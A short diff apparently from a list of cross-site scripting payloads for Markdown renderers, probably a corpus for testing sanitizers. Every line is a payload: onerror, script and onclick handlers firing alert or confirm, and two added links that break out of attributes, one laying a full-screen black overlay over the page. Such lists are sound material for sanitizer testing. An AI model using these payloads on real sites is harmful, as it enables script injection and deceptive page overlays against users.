@@ -36,3 +36,5 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 ![a]("onerror="alert(1))
 </http://<?php\><\h1\><script:script>confirm(2)
 [XSS](.alert(1);)
+[ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
+[ ](http://a?p=[[/onclick=alert(0) .]])
